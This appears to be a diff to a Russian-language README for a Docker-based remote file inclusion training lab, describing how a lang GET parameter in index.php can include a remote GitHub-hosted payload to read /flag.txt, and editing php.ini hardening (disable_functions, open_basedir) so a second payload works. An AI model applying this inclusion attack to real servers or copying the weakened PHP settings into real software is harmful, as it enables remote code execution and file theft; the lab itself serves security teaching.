@@ -24,7 +24,7 @@ docker-compose up
 ```
 - для завершения необходимо в терминале в той же папке, что и docker-compose.yaml прописать docker-compose down
 - в случае, если при новом запуске выводится ошибка подобная `ERROR: Network "remote-file-inclusion_mynetwork" needs to be recreated - IPAM option`, необходимо прописать: `docker network rm remote-file-inclusion_mynetwork` и после этого перейти к шагу 4
-- можно также менять значения переменных файле php.ini(например прописав `disable_functions = exec,passthru,shell_exec,system`)
+- можно также менять значения переменных файле php.ini(например прописав `disable_functions = exec,passthru,system`)
 ## Описание уязвимости в приложении
 Необходимо получить доступ к файлу \/flag.txt.
 В данном приложении есть возможность выбора языка, на котором отобразится текст страницы. Реализована данная возможность с помощью передачи GET параметра lang в HTTP запросе к index.php. У пользователя есть возможность обращаться только к файлам index.php и style.css.
@@ -90,4 +90,5 @@ http://lang.local/index.php?lang=https://raw.githubusercontent.com/Truncheon-eng
 ```
 Получаем флаг из \/flag.txt.
 ![](./img/photo_5269685033084515458_y.jpg)
+Для тестирования второй полезной нагрузки надо выставить в файле php.ini следующие значения `open_basedir = /app:/usr/local/etc/php/` и `disable_functions = exec,passthru,system`. В противном случае данный payload не имеет смысла.
 [LFI_with_sess_poisoning](https://github.com/Truncheon-eng/LFI_with_sess_poisoning)
